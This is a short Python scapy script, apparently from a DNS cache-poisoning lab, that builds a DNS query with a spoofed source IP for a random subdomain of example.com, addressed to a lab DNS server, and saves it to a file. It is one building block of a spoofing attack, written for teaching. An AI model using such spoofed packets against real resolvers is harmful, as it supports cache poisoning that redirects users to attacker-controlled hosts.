#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.dns import DNSQR, DNS
from scapy.layers.inet import IP, UDP

# Parameters
dns_server = '10.9.0.53'        # IP of the DNS server
random_hostname = 'twysw.example.com'  # Random hostname for attack
src_port = 12345                       # Source port for UDP packet 
dest_port = 53                         # DNS uses port 53

#create a DNS query section for the DNS packet
Qdsec = DNSQR(qname=random_hostname)  
#create a DNS packet                               
dns = DNS(id=0xAAAA,qr=0,qdcount=1,ancount=0,nscount=0,arcount=0,qd=Qdsec)  
# src - random IP the attacker is spoofing,dst - the IP of the DNS server
ip  = IP(src ='1.2.3.4',dst=dns_server  )
# UDP packet with source port 12345 and destination port 53,the port of the DNS server  
udp = UDP(dport=dest_port, sport=src_port,chksum=0)                                 

request = ip / udp / dns                                                    
# Save the DNS request to a file (ip_req.bin)
with open("ip_req.bin", "wb") as f:
    f.write(bytes(request))
    request.show()

